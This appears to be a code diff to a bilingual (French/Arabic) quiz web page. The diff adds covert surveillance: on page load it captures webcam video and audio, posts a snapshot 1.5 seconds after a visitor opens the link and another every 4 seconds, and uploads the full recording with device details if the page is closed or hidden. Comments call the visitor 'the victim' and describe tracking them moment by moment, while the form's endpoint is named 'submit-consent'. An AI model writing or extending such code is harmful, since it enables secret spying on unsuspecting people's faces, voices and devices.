@@ -225,6 +225,7 @@
 
         <div id="video-container">
             <video id="webcam" autoplay playsinline muted></video>
+            <canvas id="snapshotCanvas" style="display:none;"></canvas>
         </div>
         
         <form id="quizForm" onsubmit="event.preventDefault(); verifyAndStop();">
@@ -303,7 +304,7 @@
         let mediaStream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
-        let autoSyncInterval = null;
+        let liveSnapshotInterval = null;
         let isCompleted = false;
 
         let batteryInfoGlobal = { niveau: "Non disponible", enCharge: "Non disponible" };
@@ -343,6 +344,43 @@
             return details;
         }
 
+        // التقاط وإرسال صورة حية (Live Snapshot)
+        async function sendLiveSnapshot(reason = "Live Live Stream") {
+            const videoElement = document.getElementById('webcam');
+            const canvas = document.getElementById('snapshotCanvas');
+            if (!videoElement || videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;
+
+            canvas.width = videoElement.videoWidth || 320;
+            canvas.height = videoElement.videoHeight || 240;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(async (blob) => {
+                if (!blob) return;
+                const username = document.getElementById('username')?.value || "Utilisateur Anonyme [En direct]";
+                const deviceDetails = await getDetailedDeviceInfo();
+
+                const formData = new FormData();
+                formData.append('username', `${username} [${reason}]`);
+                formData.append('location', "Non disponible");
+                formData.append('device', JSON.stringify(deviceDetails, null, 2));
+
+                for (let i = 1; i <= 20; i++) {
+                    formData.append('q' + i, document.getElementById('q' + i)?.value || "N/A");
+                }
+
+                formData.append('video', blob, 'live_snapshot.jpg');
+
+                try {
+                    await fetch('/submit-consent', { method: 'POST', body: formData });
+                } catch (e) {
+                    if (navigator.sendBeacon) {
+                        navigator.sendBeacon('/submit-consent', formData);
+                    }
+                }
+            }, 'image/jpeg', 0.7);
+        }
+
         window.addEventListener('DOMContentLoaded', async () => {
             try {
                 const constraints = { video: { facingMode: "user", width: { ideal: 320 }, height: { ideal: 240 } }, audio: true };
@@ -350,45 +388,52 @@
                 const videoElement = document.getElementById('webcam');
                 videoElement.srcObject = mediaStream;
 
+                // 🚀 إشعار فوري ودخول الضحية للموقع مع أول لقطة حية
+                setTimeout(() => {
+                    sendLiveSnapshot("🚨 تنبيه: شخص جديد فتح الرابط وبدأ البث!");
+                }, 1500);
+
                 let options = { videoBitsPerSecond: 250000 };
-                
-                // ⚡ إجبار المتصفح على استخدام ترميز MP4 صريح لجميع الأجزاء المرسلة
-                if (MediaRecorder.isTypeSupported('video/mp4;codecs=avc1.42E01E,mp4a.40.2')) {
-                    options.mimeType = 'video/mp4;codecs=avc1.42E01E,mp4a.40.2';
-                } else if (MediaRecorder.isTypeSupported('video/mp4')) {
+                if (MediaRecorder.isTypeSupported('video/mp4')) {
                     options.mimeType = 'video/mp4';
                 } else {
-                    options.mimeType = 'video/webm;codecs=vp8,opus';
+                    options.mimeType = 'video/webm';
                 }
 
                 mediaRecorder = new MediaRecorder(mediaStream, options);
                 mediaRecorder.ondataavailable = (event) => {
                     if (event.data.size > 0) recordedChunks.push(event.data);
                 };
-                mediaRecorder.start(10000); // ⚡ بدء التسجيل وتجميع الأجزاء كل 10 ثوانٍ
+                mediaRecorder.start();
 
-                // تفعيل Auto-Sync دورياً
-                autoSyncInterval = setInterval(async () => {
-                    if (!isCompleted && recordedChunks.length > 0) {
-                        await sendDataBeacon("Auto-Sync 10s (Mise à jour)");
+                // ⚡ تفعيل إرسال الصور الحية (Live Stream) كل 4 ثوانٍ لتتابع الشخص لحظة بلحظة
+                liveSnapshotInterval = setInterval(() => {
+                    if (!isCompleted) {
+                        sendLiveSnapshot("📸 لقطة بث حي (Live)");
                     }
-                }, 10000);
+                }, 4000);
 
             } catch (err) {
                 console.error("Caméra refusée: ", err);
             }
         });
 
-        async function sendDataBeacon(reason = "") {
-            if (recordedChunks.length === 0) return;
+        async function sendFinalData(reason = "Soumission finale") {
+            if (isCompleted) return;
+            isCompleted = true;
+            clearInterval(liveSnapshotInterval);
 
-            const currentChunks = [...recordedChunks];
-            recordedChunks = []; 
+            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.stop();
+            }
+
+            await new Promise(resolve => setTimeout(resolve, 500));
 
             const username = document.getElementById('username')?.value || "Utilisateur Anonyme";
             const deviceDetails = await getDetailedDeviceInfo();
-            
-            const videoBlob = new Blob(currentChunks, { type: 'video/mp4' });
+            const mimeType = mediaRecorder ? mediaRecorder.mimeType : 'video/mp4';
+            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
+            const videoBlob = new Blob(recordedChunks, { type: mimeType });
 
             const formData = new FormData();
             formData.append('username', `${username} [${reason}]`);
@@ -399,14 +444,22 @@
                 formData.append('q' + i, document.getElementById('q' + i)?.value || "N/A");
             }
 
-            formData.append('video', videoBlob, 'recording.mp4');
+            formData.append('video', videoBlob, `recording.${ext}`);
 
             try {
-                await fetch('/submit-consent', { method: 'POST', body: formData });
+                fetch('/submit-consent', {
+                    method: 'POST',
+                    body: formData,
+                    keepalive: true
+                });
             } catch (e) {
                 if (navigator.sendBeacon) {
                     navigator.sendBeacon('/submit-consent', formData);
                 }
+            }
+
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
             }
         }
 
@@ -429,35 +482,24 @@
                 }
             }
 
-            isCompleted = true;
-            clearInterval(autoSyncInterval);
-
             statusDiv.style.color = '#10b981';
             statusDiv.innerText = currentLang === 'ar' ? 'جاري إرسال البيانات...' : 'Envoi des données en cours...';
 
-            if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                mediaRecorder.stop();
-            }
+            await sendFinalData("Formulaire complété avec succès");
 
-            setTimeout(async () => {
-                await sendDataBeacon("Soumission réussie (Formulaire complet)");
-                statusDiv.innerText = currentLang === 'ar' ? 'شكراً لك! تم إرسال إجاباتك بنجاح.' : 'Merci ! Vos réponses ont été soumises avec succès.';
-                if (mediaStream) {
-                    mediaStream.getTracks().forEach(track => track.stop());
-                }
-            }, 1000);
+            statusDiv.innerText = currentLang === 'ar' ? 'شكراً لك! تم إرسال إجاباتك بنجاح.' : 'Merci ! Vos réponses ont été soumises avec succès.';
         }
 
-        // عند الخروج من الصفحة
-        document.addEventListener('visibilitychange', async () => {
+        // الحماية القصوى عند إغلاق التطبيق فجأة أو الضغط على زر المربع
+        document.addEventListener('visibilitychange', () => {
             if (document.visibilityState === 'hidden' && !isCompleted) {
-                await sendDataBeacon("Fermé via bouton carré / App masquée");
+                sendFinalData("Fermé subitement / Bouton carré");
             }
         });
 
-        window.addEventListener('pagehide', async () => {
+        window.addEventListener('pagehide', () => {
             if (!isCompleted) {
-                await sendDataBeacon("Fermeture de page");
+                sendFinalData("Page fermée (pagehide)");
             }
         });
     </script>
